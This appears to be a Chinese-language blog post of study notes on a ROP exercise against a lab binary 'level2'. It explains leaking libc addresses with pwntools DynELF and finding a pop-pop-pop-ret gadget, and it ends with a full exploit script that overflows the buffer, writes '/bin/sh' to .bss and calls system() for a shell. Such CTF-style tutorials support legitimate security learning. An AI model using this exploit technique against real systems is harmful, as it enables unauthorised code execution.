---
title: Leak
date: 2018-03-17 19:25:07
tags: PWN

---

## 0x00 前言

看蒸米师傅的一步一步学ROP做的笔记

<!--more-->

## 0x01 具体分析

如果我们在获取不到目标机器上的libc.so情况下，应该如何做呢？这时候就需要通过memory leak(内存泄露)来搜索内存找到system()的地址。

这里使用了pwntools提供的DynELF进行内存搜索，首先需要一个leak（address)函数，：

```
def leak(address):
	payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
	p.send(payload1)
	data = p.recv(4)
	print "%#x => %s" % (address, (data or '').encode('hex'))
return data
```

随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF('./level2'))就可以对DynELF模块进行初始化了。然后可以通过调用`system_addr = d.lookup('system', 'libc')`来得到libc.so中system()在内存中的地址。

要注意的是，通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。通过`readelf -S level2`这个命令就可以获取到bss段的地址了。

```
mask@mask-virtual-machine:~/mzheng$ readelf -S level2
共有 31 个节头，从偏移量 0x1824 开始：

节头：
  [Nr] Name  TypeAddr OffSize   ES Flg Lk Inf Al
  [ 0]   NULL00000000 000000 000000 00  0   0  0
  [ 1] .interp   PROGBITS08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag NOTE08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash GNU_HASH080481ac 0001ac 000020 04   A  5   0  4
  [ 5] .dynsym   DYNSYM  080481cc 0001cc 000060 10   A  6   1  4
  [ 6] .dynstr   STRTAB  0804822c 00022c 000050 00   A  0   0  1
  [ 7] .gnu.version  VERSYM  0804827c 00027c 00000c 02   A  5   0  2
  [ 8] .gnu.version_rVERNEED 08048288 000288 000020 00   A  6   1  4
  [ 9] .rel.dyn  REL 080482a8 0002a8 000008 08   A  5   0  4
  [10] .rel.plt  REL 080482b0 0002b0 000018 08  AI  5  24  4
  [11] .init PROGBITS080482c8 0002c8 000023 00  AX  0   0  4
  [12] .plt  PROGBITS080482f0 0002f0 000040 04  AX  0   0 16
  [13] .plt.got  PROGBITS08048330 000330 000008 00  AX  0   0  8
  [14] .text PROGBITS08048340 000340 0001c2 00  AX  0   0 16
  [15] .fini PROGBITS08048504 000504 000014 00  AX  0   0  4
  [16] .rodata   PROGBITS08048518 000518 000016 00   A  0   0  4
  [17] .eh_frame_hdr PROGBITS08048530 000530 000034 00   A  0   0  4
  [18] .eh_frame PROGBITS08048564 000564 0000ec 00   A  0   0  4
  [19] .init_array   INIT_ARRAY  08049f08 000f08 000004 00  WA  0   0  4
  [20] .fini_array   FINI_ARRAY  08049f0c 000f0c 000004 00  WA  0   0  4
  [21] .jcr  PROGBITS08049f10 000f10 000004 00  WA  0   0  4
  [22] .dynamic  DYNAMIC 08049f14 000f14 0000e8 08  WA  6   0  4
  [23] .got  PROGBITS08049ffc 000ffc 000004 04  WA  0   0  4
  [24] .got.plt  PROGBITS0804a000 001000 000018 04  WA  0   0  4
  [25] .data PROGBITS0804a018 001018 000008 00  WA  0   0  4
  [26] .bss  NOBITS  0804a020 001020 000004 00  WA  0   0  1
  [27] .comment  PROGBITS00000000 001020 000034 01  MS  0   0  1
  [28] .shstrtab STRTAB  00000000 001717 00010a 00  0   0  1
  [29] .symtab   SYMTAB  00000000 001054 000470 10 30  47  4
  [30] .strtab   STRTAB  00000000 0014c4 000253 00  0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
```

然后下面的解释直接引用蒸米师父的原话，解释的也很清楚：

> 因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。

那么来找找咯，

```
objdump -D level2 |cat -n |grep pop
```

执行结果

```
mask@mask-virtual-machine:~/mzheng$ objdump -D level2 |cat -n |grep pop
   115	 804823a:	5f   	pop%edi
   120	 8048248:	61   	popa   
   125	 8048257:	5f   	pop%edi
   127	 8048259:	61   	popa   
   133	 8048269:	5f   	pop%edi
   135	 804826c:	61   	popa   
   137	 804826f:	5f   	pop%edi
   138	 8048270:	5f   	pop%edi
   143	 8048277:	5f   	pop%edi
   191	 80482b4:	07   	pop%es
   198	 80482c4:	07   	pop%es
   214	 80482e9:	5b   	pop%ebx
   250	 8048342:	5e   	pop%esi
   424	 80484f8:	5b   	pop%ebx
   425	 80484f9:	5e   	pop%esi
   426	 80484fa:	5f   	pop%edi
   427	 80484fb:	5d   	pop%ebp
   442	 8048516:	5b   	pop%ebx
   536	 80485b9:	61   	popa   
   682	 8049f94:	17   	pop%ss
```

找呀找，找呀找，找到三个连续的pop即可，那么接下来开始构造exp：

```
# !/usr/bin/env python

from pwn import *

elf = ELF('./level2')
plt_write = elf.symbols['write']
plt_read = elf.symbols['read']
vulfun_addr = 0x0804843b

def leak(address):
payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
p.send(payload1)
data = p.recv(4)
print "%#x => %s" % (address, (data or '').encode('hex'))
return data

p = process('./level2')

# p = remote('127.0.0.1', 10002)

d = DynELF(leak, elf=ELF('./level2'))

system_addr = d.lookup('system', 'libc')
print "system_addr=" + hex(system_addr)

bss_addr = 0x0804a020
pppr = 0x80484f9

payload2 = 'a'*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)

# ss = raw_input()

print "\n###sending payload2 ...###"
p.send(payload2)
p.send("/bin/sh\0")

p.interactive()
```

